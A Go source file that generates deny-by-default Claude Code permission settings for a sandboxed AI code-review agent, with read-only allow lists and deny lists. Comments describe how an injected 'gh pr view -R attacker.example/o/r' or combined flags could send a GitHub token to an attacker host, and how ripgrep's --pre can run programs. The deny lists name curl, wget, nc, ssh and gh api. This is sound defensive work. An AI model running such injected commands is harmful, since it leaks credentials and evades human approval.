package pr

import (
	"encoding/json"
	"errors"
	"fmt"
	"log/slog"
	"os"
	"path/filepath"
	"strconv"
)

// allowlistSettings is the Claude Code settings document written into a
// clean-room workspace for agent A. It is DENY-BY-DEFAULT: the agent may only
// read and run read-only inspection commands. It has NO permission to post a
// review, comment, merge, or push — posting is gated exclusively by forgectl's
// human approval gate, never by the agent itself.
type allowlistSettings struct {
	Permissions permissions `json:"permissions"`
}

type permissions struct {
	// DefaultMode "plan" keeps the agent from editing or running unlisted
	// commands without an explicit prompt — the deny-by-default floor.
	DefaultMode string   `json:"defaultMode"`
	Allow       []string `json:"allow"`
	Deny        []string `json:"deny"`
}

// baseReadOnly is the read-only inspection surface both review modes share:
// read the tree and run read-only git/file commands. Every entry is
// inspection, never mutation or posting. Deliberately excludes `rg`: ripgrep's
// `--pre <cmd>` flag runs an arbitrary program per searched file, a real
// command-execution primitive. allowReadOnly (PR mode) accepts that risk
// behind PostReview's human approval gate; local mode has no such gate, so
// localAllowReadOnly grants exactly baseReadOnly and never adds rg back — the
// built-in Grep tool (already granted) covers search without shelling out to
// a binary that can execute arbitrary commands. Kept as a single shared slice
// so the two modes' genuinely common surface cannot drift out of sync.
var baseReadOnly = []string{
	"Read",
	"Grep",
	"Glob",
	"LS",
	"Bash(git diff:*)",
	"Bash(git log:*)",
	"Bash(git show:*)",
	"Bash(git status:*)",
	"Bash(git blame:*)",
	"Bash(cat:*)",
}

// allowReadOnly is the static part of a PR-mode review's permitted actions:
// baseReadOnly plus rg (see baseReadOnly's doc — safe here behind the approval
// gate). The gh reads are NOT here: prGhReadRules generates them per session,
// naming the PR's own number, host, and base repository (forgectl#673).
var allowReadOnly = append(append([]string{}, baseReadOnly...),
	"Bash(rg:*)",
)

// prGhReadCommands are the only gh invocations a PR-mode review agent may run,
// spelled exactly as the agent must type them. Each names the PR by number and
// the BASE repository by HOST/OWNER/REPO, so the agent reads the PR it was
// asked to review rather than whatever an argument-less `gh pr view` resolves
// from the workspace clone, which is the head repository and may be a fork.
//
// They are exact commands, not prefixes, because a prefix cannot hold. The
// former `Bash(gh pr view:*)` admitted any trailing text, so an injected
// `gh pr view -R attacker.example/o/r 1` — or `gh pr view 1 --repo H/O/R
// -R attacker.example/o/r`, since gh takes the last --repo given — sent gh,
// and any ambient GH_ENTERPRISE_TOKEN, to a host nobody chose. A deny rule for
// `-R` cannot close that either: pflag accepts combined short flags
// (`-cRattacker.example/o/r`), and a PR URL operand selects a host with no
// flag at all. Claude Code matches a Bash rule with no `*` as one exact
// command, so each entry here admits nothing but itself; a compound command is
// split first, so `<entry> | head` still matches on the gh half.
//
// The caller guarantees host, owner, and repo are charset-validated
// (ValidHostSegment, ValidOwnerRepoPart); prGhReadRules checks it.
func prGhReadCommands(host string, ref Ref) []string {
	target := strconv.Itoa(ref.Number) + " --repo " + host + "/" + ref.Owner + "/" + ref.Repo
	return []string{
		"gh pr view " + target,
		"gh pr view " + target + " --comments",
		"gh pr diff " + target,
		"gh pr diff " + target + " --name-only",
		"gh pr checks " + target,
	}
}

// prGhReadRules renders prGhReadCommands as exact-match Bash allow rules. It
// refuses a value outside the host and owner/repo charsets: those exclude
// space, `*`, and `)`, the characters that would widen or break a rule, so a
// value that passed them cannot turn an exact rule into a pattern.
func prGhReadRules(host string, ref Ref) ([]string, error) {
	if !ValidHostSegment(host) || !ValidOwnerRepoPart(ref.Owner) || !ValidOwnerRepoPart(ref.Repo) || ref.Number <= 0 {
		return nil, errors.New("refusing to write the review allow-list: the PR's host, owner, repo, or number failed validation")
	}
	cmds := prGhReadCommands(host, ref)
	rules := make([]string, 0, len(cmds))
	for _, cmd := range cmds {
		rules = append(rules, "Bash("+cmd+")")
	}
	return rules, nil
}

// denyPosting is a best-effort defense-in-depth backstop, NOT the authoritative
// gate. PR mode cannot blanket-deny `gh` (it must allow the prGhReadRules reads,
// and Deny takes precedence over Allow, so a `Bash(gh:*)` deny would clobber
// those reads), so allowReadOnly — the deny-by-default allow-list — is what
// actually confines the agent to read-only actions. This enumerated deny list
// exists so that even if the DefaultMode "plan" floor is relaxed, the most
// dangerous mutating/stateful surfaces stay hard-blocked: the posting `gh pr`
// verbs, raw `gh api`, the mutating gh command groups enumerated below, git
// push, git commit, arbitrary URL fetches, and the file/notebook write tools.
// Completeness is deliberately NOT the claim — an enumeration can't cover every
// gh subcommand without a blanket `gh:*` deny that would break the allowed
// reads; the allow-list is the real gate. Deny takes precedence over allow in
// Claude Code's permission model, so each entry is a hard block; none overlaps
// allowReadOnly, so no read is affected.
var denyPosting = []string{
	"Bash(gh pr review:*)",
	"Bash(gh pr comment:*)",
	"Bash(gh pr merge:*)",
	"Bash(gh pr close:*)",
	"Bash(gh pr edit:*)",
	"Bash(gh pr ready:*)",
	"Bash(gh pr reopen:*)",
	"Bash(gh pr lock:*)",
	"Bash(gh pr unlock:*)",
	"Bash(gh api:*)",
	"Bash(gh workflow:*)",
	"Bash(gh release:*)",
	"Bash(gh secret:*)",
	"Bash(gh variable:*)",
	"Bash(gh ruleset:*)",
	"Bash(gh issue:*)",
	"Bash(gh gist:*)",
	"Bash(gh repo:*)",
	"Bash(gh run:*)",
	"Bash(gh auth:*)",
	"Bash(gh config:*)",
	"Bash(gh label:*)",
	"Bash(gh project:*)",
	"Bash(gh cache:*)",
	"Bash(gh codespace:*)",
	"Bash(gh extension:*)",
	"Bash(gh alias:*)",
	"Bash(git push:*)",
	"Bash(git commit:*)",
	"Bash(curl:*)",
	"Bash(wget:*)",
	"Write",
	"Edit",
	"MultiEdit",
	"NotebookEdit",
	"WebFetch",
}

// writeAllowlist writes the deny-by-default settings file into workspace's
// .claude/ dir and returns its path. Written before the review agent is
// dispatched, it is the agent's only permission surface inside the clean room.
// host is the PR's own host (Client.prHost) and ref names the PR; together
// they generate the only gh reads the agent may run (prGhReadRules).
func writeAllowlist(workspace, host string, ref Ref) (string, error) {
	ghReads, err := prGhReadRules(host, ref)
	if err != nil {
		return "", err
	}
	return writeSettings(workspace, permissions{
		DefaultMode: "plan",
		Allow:       append(append([]string{}, allowReadOnly...), ghReads...),
		Deny:        denyPosting,
	})
}

// localAllowReadOnly is the local session's permitted-action set: the same
// entries as baseReadOnly, copied rather than aliased — a bare slice-header
// assignment here would share baseReadOnly's backing array, so an in-place
// mutation of either slice (e.g. index-assignment) would silently corrupt the
// other, defeating the point of the two having independent names. Unlike
// allowReadOnly, it grants no rg (no approval-gate backstop — see
// baseReadOnly's doc) and no gh entries at all — local mode permits no
// GitHub round-trip, not even a read-only one.
var localAllowReadOnly = append([]string{}, baseReadOnly...)

// localDenyNetwork is deliberately broader than denyPosting: it denies every
// gh subcommand (not just the posting ones) and every network-reaching git
// verb (fetch/pull/clone/remote/submodule), not just push — the literal "no
// network CLI" requirement for an offline review, applied as defense-in-depth
// on top of DefaultMode "plan" already blocking anything unlisted.
//
// Deliberately no bare "Write" here: Deny takes precedence over Allow, so a
// blanket Write deny would clobber the scoped Write(findingsDir/**) grant
// localProfile adds to Allow. Write is handled entirely by scoping to the
// findings dir, not by omission-then-deny.
var localDenyNetwork = []string{
	"Bash(gh:*)",
	"Bash(git push:*)",
	"Bash(git fetch:*)",
	"Bash(git pull:*)",
	"Bash(git clone:*)",
	"Bash(git remote:*)",
	"Bash(git submodule:*)",
	"Bash(git commit:*)",
	"Bash(curl:*)",
	"Bash(wget:*)",
	"Bash(ssh:*)",
	"Bash(scp:*)",
	"Bash(nc:*)",
	"Edit",
	"MultiEdit",
	"NotebookEdit",
	"WebFetch",
}

// localProfile builds the deny-by-default permission set for a local review
// session: baseReadOnly (no rg, no gh), plus exactly one scoped Write grant
// to findingsDir — the sole path outside the reviewed worktree the agent may
// write to.
func localProfile(findingsDir string) permissions {
	allow := append(append([]string{}, localAllowReadOnly...), fmt.Sprintf("Write(%s/**)", findingsDir))
	return permissions{
		DefaultMode: "plan",
		Allow:       allow,
		Deny:        localDenyNetwork,
	}
}

// writeLocalAllowlist writes localProfile's settings into workspace's
// .claude/ dir and returns its path. Mirrors writeAllowlist.
func writeLocalAllowlist(workspace, findingsDir string) (string, error) {
	return writeSettings(workspace, localProfile(findingsDir))
}

// writeSettings writes perms into workspace's .claude/settings.local.json and
// returns its path — the shared write core for writeAllowlist and
// writeLocalAllowlist.
func writeSettings(workspace string, perms permissions) (string, error) {
	slog.Debug("Preparing to write clean-room allowlist.", "workspace", workspace)
	dir := filepath.Join(workspace, ".claude")
	if err := os.MkdirAll(dir, 0o700); err != nil {
		slog.Error("Failed to create allowlist dir.", "dir", dir, "error", err)
		return "", fmt.Errorf("create allowlist dir: %w", err)
	}
	settings := allowlistSettings{Permissions: perms}
	// termsafe:allow-raw-json persisted Claude settings file, never command output
	data, err := json.MarshalIndent(settings, "", "  ")
	if err != nil {
		return "", fmt.Errorf("marshal allowlist: %w", err)
	}
	path := filepath.Join(dir, "settings.local.json")
	if err := os.WriteFile(path, append(data, '\n'), 0o600); err != nil {
		slog.Error("Failed to write allowlist.", "path", path, "error", err)
		return "", fmt.Errorf("write allowlist %s: %w", path, err)
	}
	slog.Debug("Successfully wrote clean-room allowlist.", "path", path)
	return path, nil
}
